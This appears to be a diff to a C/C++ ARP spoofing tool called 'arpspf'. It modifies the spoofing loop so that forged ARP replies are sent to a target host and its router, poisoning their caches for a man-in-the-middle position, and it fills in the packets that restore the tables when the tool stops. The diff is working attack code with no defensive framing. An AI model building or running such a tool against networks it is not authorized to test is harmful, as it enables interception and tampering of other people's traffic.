@@ -23,7 +23,7 @@ int main(int argc,char** argv){
     // sudo sysctl net.ipv4.ip_forward=0
     int retv = 0;
     if(argc < 3){
-        printf("usage: sudo arpspf \"ifname\" \"target ip\"\n");
+        printf("usage: sudo ./arpspf \"ifname\" \"target ip\"\n");
         return 1;
     }
     // Parse args
@@ -91,16 +91,26 @@ int main(int argc,char** argv){
     fds[0].events = POLLIN;
     // Enable keyboard interrupt handler
     signal(SIGINT,sigintHandler);
-    // Initial spoofing
+    // Initial spoofing - send grat. ARP
     sendto(sockArp,targetArp.buffer,ARP_MSG_LEN,0,(sockaddr*)&routerAddr,sizeof(routerAddr));
     sendto(sockArp,routerArp.buffer,ARP_MSG_LEN,0,(sockaddr*)&targetAddr,sizeof(routerAddr));
+    // Config packets to non grat. ARP
+    *targetArp.oper = 2;
+    memcpy(targetArp.tpa,routerIp,ARP_PROTO_LEN);
+    memcpy(targetArp.tha,routerMac,ARP_HARDWARE_LEN);
+    //
+    *routerArp.oper = 2;
+    memcpy(routerArp.tpa,targetIp,ARP_PROTO_LEN);
+    memcpy(routerArp.tha,targetMac,ARP_HARDWARE_LEN);
     while(!sigintFl){
-        retv = poll(fds,1,100); // 100 ms timeout
+        retv = poll(fds,1,1000); // 1 s timeout
         if(retv < 0){
             printf("Socket poll error\n");
             break;
         }
-        if(retv > 0){
+        // ARP socket recieved data
+        if(fds[0].revents & POLLIN){
+            fds[0].revents = 0;
             recvfrom(sockArp,listenArp.buffer,ARP_MSG_LEN,0,NULL,NULL);
             uint8_t check = listenArp.check();
             if(check == 0){
@@ -121,8 +131,17 @@ int main(int argc,char** argv){
     }
     // Create true ARP packets
     printf("ARP spoofing stopped, recovering ARP tables\n");
+    // Create packets
     memcpy(targetArp.sha,targetMac,ARP_HARDWARE_LEN);
+    memcpy(targetArp.spa,targetIp,ARP_PROTO_LEN);
+    memcpy(targetArp.tha,broadcastMac,ARP_HARDWARE_LEN);
+    memcpy(targetArp.tpa,targetIp,ARP_PROTO_LEN);
+    //
     memcpy(routerArp.sha,routerMac,ARP_HARDWARE_LEN);
+    memcpy(routerArp.spa,routerIp,ARP_PROTO_LEN);
+    memcpy(routerArp.tha,broadcastMac,ARP_HARDWARE_LEN);
+    memcpy(routerArp.tpa,routerIp,ARP_PROTO_LEN);
+    // Send packets
     sendto(sockArp,routerArp.buffer,ARP_MSG_LEN,0,(sockaddr*)&targetAddr,sizeof(targetAddr));
     sendto(sockArp,targetArp.buffer,ARP_MSG_LEN,0,(sockaddr*)&routerAddr,sizeof(routerAddr));
     printf("ARP tables recovered\n");
